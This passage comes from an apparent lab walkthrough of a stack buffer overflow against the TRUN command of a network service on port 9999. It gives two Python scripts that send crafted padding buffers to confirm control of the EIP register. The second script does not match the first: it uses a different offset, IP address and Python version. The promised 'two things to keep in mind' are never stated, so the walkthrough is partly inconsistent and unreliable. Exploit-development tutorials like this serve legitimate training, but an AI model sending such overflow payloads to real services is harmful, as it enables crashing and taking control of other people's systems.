Before Overwriting the EIP with our Payload, we will check if we are correct or not, by using the following script.

*overwrite.py*

```python
#!/usr/bin/python3

import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.137.134',9999))
	
	payload = "TRUN /.:/" + shellcode
	
	s.send((payload.encode()))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
```

Now, if our **EIP** address is correct, then after 2003 A's up until **EBP** Register, the value of **EIP Register** should be 4 B's or `42424242`.

And we are correct.

Now we just need to replace the Shellcode with our Exploit, but have to keep 2 things in mind before doing that.

*3.py*
```
#!/usr/bin/python
import socket

try:
  print "\n[+] Sending evil buffer..."
  offset = "A" * 524
  eip = "B" * 4
  shellcode = "C" * (1000 - len(offset) - len(eip))

  buffer = offset + eip + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.135.10", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Sending buffer: " + buffer
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
```
